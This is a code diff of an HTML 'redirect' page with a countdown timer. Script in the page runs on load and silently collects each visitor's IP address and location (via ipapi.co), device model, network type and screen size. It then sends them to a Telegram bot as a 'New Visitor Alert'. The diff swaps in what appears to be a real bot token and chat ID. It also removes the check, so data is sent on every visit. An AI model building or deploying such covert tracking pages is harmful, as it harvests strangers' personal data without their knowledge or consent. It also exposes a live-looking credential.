@@ -14,7 +14,6 @@
       padding: 0;
       font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
     }
-
     body {
       background: #090d16;
       background-image: 
@@ -28,7 +27,6 @@
       padding: 16px;
       overflow: hidden;
     }
-
     .redirect-card {
       background: rgba(30, 41, 59, 0.65);
       backdrop-filter: blur(20px);
@@ -39,10 +37,8 @@
       width: 100%;
       max-width: 380px;
       text-align: center;
-      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7), 
-                  0 0 30px rgba(37, 99, 235, 0.1);
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7), 0 0 30px rgba(37, 99, 235, 0.1);
     }
-
     .destination-box {
       background: rgba(15, 23, 42, 0.7);
       border-radius: 14px;
@@ -54,35 +50,29 @@
       align-items: center;
       gap: 6px;
     }
-
     .destination-label {
       font-size: 0.75rem;
       color: #94a3b8;
     }
-
     .destination-name {
       font-size: 1.2rem;
       font-weight: 800;
       color: #38bdf8;
       word-break: break-all;
     }
-
     .timer-section {
       margin-bottom: 10px;
     }
-
     .timer-text {
       font-size: 0.85rem;
       color: #e2e8f0;
       margin-bottom: 10px;
     }
-
     .seconds-counter {
       font-weight: 800;
       color: #f43f5e;
       font-size: 1.15rem;
     }
-
     .progress-bar-bg {
       width: 100%;
       height: 6px;
@@ -90,7 +80,6 @@
       border-radius: 10px;
       overflow: hidden;
     }
-
     .progress-bar-fill {
       height: 100%;
       width: 100%;
@@ -117,12 +106,12 @@
   </div>
 
   <script>
-    // ⚙️ حط هنا بيانات بوت التليجرام الخاص بك:
-    const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-    const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
+    // تم إضافة التوكن والـ Chat ID الخاص بك هنا مباشرة:
+    const TELEGRAM_BOT_TOKEN = "8728217018:AAHctv9Xsgm9UklqD27jfzBrbOJX100dYqE";
+    const TELEGRAM_CHAT_ID = "8718173410";
 
-    const defaultUrl = "https://payment-mohamed.vercel.app/";
-    const defaultName = "Payment Page";
+    const defaultUrl = "https://go-noo.vercel.app/";
+    const defaultName = "Main Page";
 
     let targetUrl = defaultUrl;
     let displayName = defaultName;
@@ -151,7 +140,6 @@
       document.getElementById('dest-name').textContent = displayName;
       document.getElementById('page-title').textContent = "Redirecting to " + displayName;
 
-      // جمع البيانات وإرسالها لتليجرام فوراً
       collectAndSendToTelegram();
       startCountdown();
     }
@@ -159,22 +147,12 @@
     function getExactDeviceModel() {
       const ua = navigator.userAgent;
       let deviceName = "Unknown Device";
-
       if (/android/i.test(ua)) {
         let match = ua.match(/\b([A-Z][A-Za-z0-9\-_]+(?:\s+[A-Za-z0-9\-_]+){1,3})\s+Build\//);
         if (match && match[1]) {
           deviceName = match[1].trim();
         } else {
-          let parts = ua.split(';');
-          for (let part of parts) {
-            if (part.includes('CPH') || part.includes('SM-') || part.includes('Redmi') || part.includes('Reno') || part.includes('Pixel')) {
-              deviceName = part.trim();
-              break;
-            }
-          }
-          if (deviceName === "Unknown Device") {
-            deviceName = "Android Device";
-          }
+          deviceName = "Android Device";
         }
       } else if (/iPad|iPhone|iPod/.test(ua)) {
         deviceName = /iPad/.test(ua) ? "iPad" : "Apple iPhone";
@@ -183,7 +161,6 @@
       } else if (/Mac/i.test(ua)) {
         deviceName = "Mac OS";
       }
-
       return deviceName;
     }
 
@@ -191,9 +168,7 @@
       try {
         const ipResponse = await fetch('https://ipapi.co/json/');
         const ipData = await ipResponse.json();
-
         const exactModel = getExactDeviceModel();
-
         const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         const networkType = connection ? (connection.effectiveType || connection.type || "Unknown") : "Unknown";
 
@@ -207,7 +182,6 @@
           }
         }
 
-        // صياغة الرسالة بشكل مرتب وجميل لتصلك على تليجرام
         const message = 
           `🚨 **New Visitor Alert!**\n\n` +
           `📌 **Destination:** ${displayName}\n` +
@@ -221,19 +195,15 @@
           `📐 **Resolution:** ${window.screen.width}x${window.screen.height}\n` +
           `⏰ **Time:** ${new Date().toLocaleString()}`;
 
-        // إرسال البيانات عبر Telegram API مباشرة
-        if (TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE") {
-          await fetch(`https://api.telegram.org/bot${8728217018:AAHctv9Xsgm9UklqD27jfzBrbOJX100dYqE}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: 8718173410,
-              text: message,
-              parse_mode: 'Markdown'
-            })
-          });
-        }
-
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
       } catch (err) {
         console.error("Error sending to telegram:", err);
       }
@@ -244,20 +214,15 @@
       let timeLeft = totalTime;
       const countdownEl = document.getElementById('countdown');
       const progressEl = document.getElementById('progress');
-
       const intervalTime = 100;
       const decrement = intervalTime / 1000;
 
       const timer = setInterval(() => {
         timeLeft -= decrement;
-        if (timeLeft <= 0) {
-          timeLeft = 0;
-        }
+        if (timeLeft <= 0) timeLeft = 0;
         
         countdownEl.textContent = timeLeft.toFixed(1);
-        
-        let percentage = (timeLeft / totalTime) * 100;
-        progressEl.style.width = percentage + '%';
+        progressEl.style.width = ((timeLeft / totalTime) * 100) + '%';
 
         if (timeLeft <= 0) {
           clearInterval(timer);
@@ -268,6 +233,5 @@
 
     initRedirectSystem();
   </script>
-
 </body>
 </html>
